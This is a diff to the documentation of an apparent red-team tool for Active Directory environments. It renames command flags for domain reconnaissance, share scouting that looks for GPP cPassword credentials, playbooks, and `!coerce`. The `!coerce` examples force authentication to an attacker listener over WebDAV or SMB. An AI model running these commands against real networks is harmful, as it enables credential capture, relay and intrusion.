@@ -11,7 +11,7 @@ marker.
 
 `!adtriage` summarizes domain identity, trusts, privileged groups, SPNs,
 AS-REP candidates, delegation attributes, gMSA/dMSA indicators, and a quick
-ADCS view. `-q` restricts slower sections. The results are reconnaissance and
+ADCS view. `--quick` restricts slower sections. The results are reconnaissance and
 do not modify AD.
 
 ### Share scout
@@ -19,7 +19,7 @@ do not modify AD.
 `!shares` inventories local shares and optional target hosts, probes UNC read
 and write access, reviews broad ACL entries, checks SYSVOL/NETLOGON for selected
 sensitive patterns, and identifies GPP `cPassword` material when visible.
-`-q` limits the work.
+`--quick` limits the work.
 
 ### Session scout
 
@@ -54,10 +54,10 @@ SMB/WMI/RDP, execute on discovered hosts, or create sessions automatically.
 ## Outbound UNC authentication probe (`!coerce`)
 
 ```text
-!coerce --listener 10.10.14.5
-!coerce --listener relay.lab --method webdav --port 8080
-!coerce --listener 10.10.14.5 --method smb
-!coerce --listener 10.10.14.5 --method all
+!coerce webdav --listener 10.10.14.5
+!coerce webdav --listener relay.lab --port 8080
+!coerce smb --listener 10.10.14.5
+!coerce all --listener 10.10.14.5
 ```
 
 The listener is encoded before insertion into PowerShell. `webdav` accesses a
@@ -83,8 +83,8 @@ cleanup plan. This behavior is disk staging even though it avoids launching
 
 ## Playbooks (`!playbook`)
 
-Built-ins are listed with `!playbook --list` and executed with
-`!playbook --run NAME`. A custom JSON file uses `--file PATH`.
+Built-ins are listed with `!playbook list` and executed with
+`!playbook run NAME`. A custom JSON file uses `!playbook run --file PATH`.
 
 Minimal schema:
 
